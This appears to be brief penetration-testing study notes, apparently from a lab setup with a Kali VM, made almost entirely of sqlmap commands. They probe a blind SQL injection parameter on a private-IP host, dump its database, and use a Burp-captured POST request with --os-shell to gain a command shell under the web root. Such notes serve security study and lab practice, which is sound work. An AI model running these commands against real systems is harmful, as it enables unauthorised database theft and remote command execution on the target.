- sqlmap
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user

sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

First, we need to intercept the POST request via Burp and save it as a local text file on our Kali VM.
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"